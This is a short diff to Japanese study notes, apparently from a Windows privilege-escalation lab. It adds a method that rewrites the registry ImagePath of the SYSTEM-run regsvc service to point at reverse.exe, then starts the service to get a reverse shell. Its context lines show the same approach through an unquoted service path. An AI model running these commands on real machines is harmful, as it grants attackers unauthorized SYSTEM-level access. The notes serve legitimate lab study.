@@ -14,3 +14,11 @@ C:\Program Files\Unquoted Path Service\ への書込権限が必要
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 net start daclsvc で サービス実行すると、reverse.exe が起動する
 
+3. regsvc を利用したリバースシェルの実行
+・条件
+regsvc が SYSTEM 権限で動作している (SERVICE_START_NAME)
+regsvc service のレジストリを NT AUTHORITY\INTERACTIVE に所属するユーザが書き込めること
+・方法
+以下の手順で、レジストリの追加し、サービスを起動する。
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+net start regsvc
